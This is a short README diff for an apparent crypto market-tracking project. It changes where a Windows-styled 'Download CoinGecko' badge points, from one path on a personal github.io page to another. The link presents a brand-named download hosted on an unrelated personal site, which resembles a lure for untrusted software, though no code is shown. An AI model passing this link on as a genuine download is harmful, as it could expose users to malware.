@@ -8,7 +8,7 @@ Tracking global digital asset valuations, trust scores, exchange volume metrics,
 
 ---
 
-[![Download CoinGecko](https://img.shields.io/badge/Download-CoinGecko-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://samonaregina.github.io/.github/CoinGecko-Market-Monitor)
+[![Download CoinGecko](https://img.shields.io/badge/Download-CoinGecko-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://samonaregina.github.io/.github/CoinGecko-Price-Aggregator)
 
 ---
 
